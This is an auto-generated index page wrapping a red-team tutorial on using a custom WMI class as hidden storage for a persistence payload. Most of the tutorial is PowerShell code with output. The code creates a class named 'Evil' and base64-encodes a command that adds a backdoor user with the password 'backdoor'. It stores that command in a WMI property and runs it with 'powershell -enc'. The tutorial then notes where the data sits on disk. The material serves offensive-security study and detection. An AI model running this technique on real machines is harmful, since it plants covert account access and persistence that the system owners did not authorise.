---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# WMI as a Data Storage

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1084-abusing-windows-managent-instrumentation-wmi-data-storage` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1084-abusing-windows-managent-instrumentation/wmi-data-storage.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [WMI as a Data Storage](../../topics/offensive-security/wmi-as-a-data-storage.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-persistence-t1084-abusing-windows-managent-instrumentation-wmi-data-storage |
| name | WMI as a Data Storage |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/persistence/t1084-abusing-windows-managent-instrumentation/wmi-data-storage.md |

## Preserved Source Material

````yaml
_asset_filenames:
- wim-setting-payload.png
- wmi-data-storage-newclass.png
- wmi-evil-mof.png
- wmi-objects-data.png
- wmi-payload-commited.png
- wmi-payload-executed.png
_body: "---\ndescription: >-\n  Exploring WMI as a data storage for persistence by leveraging WMI classes and\n  their properties.\n\
  ---\n\n# WMI as a Data Storage\n\n## Execution\n\nCreating a new WMI class with a property `EvilProperty` that will later\
  \ store the payload to be executed:\n\n```csharp\n$evilClass = New-Object management.managementclass('root\\cimv2',$null,$null)\n\
  $evilClass.Name = \"Evil\"\n$evilClass.Properties.Add('EvilProperty','Tis notin good sir')\n$evilClass.Put()\n\nPath   \
  \       : \\\\.\\root\\cimv2:Evil\nRelativePath  : Evil\nServer        : .\nNamespacePath : root\\cimv2\nClassName     :\
  \ Evil\nIsClass       : True\nIsInstance    : False\nIsSingleton   : False\n```\n\nWe can see the `Evil` class properties:\n\
  \n```csharp\n([wmiclass] 'Evil').Properties\n\nName       : EvilProperty\nValue      : Tis notin good sir\nType       :\
  \ String\nIsLocal    : True\nIsArray    : False\nOrigin     : Evil\nQualifiers : {CIMTYPE}\n```\n\nChecking WMI Explorer\
  \ shows the new `Evil` class has been created under the `root\\cimv2` namepace - note the `EvilProperty` can also be observed:\n\
  \n![](../../../.gitbook/assets/wmi-data-storage-newclass.png)\n\n### Storing Payload\n\nFor storing the payload inside the\
  \ `EvilProperty`, let's create a base64 encoded powershell command that adds a backdoor user with credentials `backdoor:backdoor`:\n\
  \n```csharp\n$command = \"cmd '/c net user add backdoor backdoor /add'\"\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n\
  $encodedCommand = [Convert]::ToBase64String($bytes)\n\n# $encodedCommand = YwBtAGQAIAAvAGMAIAAnAG4AZQB0ACAAdQBzAGUAcgAgAGIAYQBjAGsAZABvAG8AcgAgAGIAYQBjAGsAZABvAG8AcgAgAC8AYQBkAGQAJwA=\n\
  ```\n\nUpdating `EvilProperty` attribute to store `$encodedCommand`:\n\n```csharp\n$evilClass.Properties.Add('EvilProperty',\
  \ $encodedCommand)\n```\n\nBelow is the same as above, just in a screenshot:\n\n![](../../../.gitbook/assets/wim-setting-payload.png)\n\
  \n### Real Execution\n\n```csharp\npowershell.exe -enc $evilClass.Properties['EvilProperty'].Value\n```\n\nExecuting the\
  \ payload stored in the property of a WMI class's property - note that the backdoor user has been successfully added:\n\n\
  ![](../../../.gitbook/assets/wmi-payload-executed.png)\n\nIf we commit the `$evilClass` with its `.Put()` method, our payload\
  \ will get stored permanently in the WMI Class. Note how a new \"Evil\" class' properties member shows the payload we have\
  \ commited:\n\n![](../../../.gitbook/assets/wmi-payload-commited.png)\n\n## Observations\n\nUsing the WMI Explorer, we can\
  \ inspect the class' definition which is stored in`%SystemRoot%\\System32\\wbem\\Repository\\OBJECTS.DATA` \n\nThe file\
  \ contains all the classes and other relevant information about those classes. In our case, we can see the `EvilProperty`\
  \ with our malicious payload inside:\n\n![](../../../.gitbook/assets/wmi-evil-mof.png)\n\nWhen inspecting the OBJECTS.DATA\
  \ with a hex editor, it is possible \\(although not very practical nor user friendly\\) to find the same data - note that\
  \ the screenshot is referring to the state of the Evil class at the very beginning of its creation as this is when I took\
  \ the screenshot:\n\n![](../../../.gitbook/assets/wmi-objects-data.png)"
_relative_path: offensive-security/persistence/t1084-abusing-windows-managent-instrumentation/wmi-data-storage.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1084-abusing-windows-managent-instrumentation/wmi-data-storage.md
````
